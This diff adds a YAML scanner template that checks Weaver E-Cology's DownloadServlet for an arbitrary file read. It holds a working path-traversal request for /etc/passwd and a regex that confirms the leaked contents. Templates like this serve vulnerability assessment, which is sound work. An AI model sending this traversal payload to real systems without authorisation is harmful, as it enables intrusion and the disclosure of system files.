@@ -1,0 +1,27 @@
+id: scopesentry-weaver-downloadservlet-fileread
+
+info:
+  name: Weaver E-Cology DownloadServlet Arbitrary File Read
+  author: scopesentry
+  severity: high
+  description: |
+    泛微 E-Cology /weaver/weaver.file.DownloadServlet 的 fileid 参数未约束路径，可直接读系统文件。
+    判据：/etc/passwd 内容原样回显（root:x:0:0:）。只读，不落文件、不写 webshell。
+  tags: weaver,e-cology,lfi,file-read
+  metadata:
+    verified: false
+    max-request: 1
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/weaver/weaver.file.DownloadServlet?fileid=../../../../../../../../etc/passwd'
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+      - type: status
+        status:
+          - 200
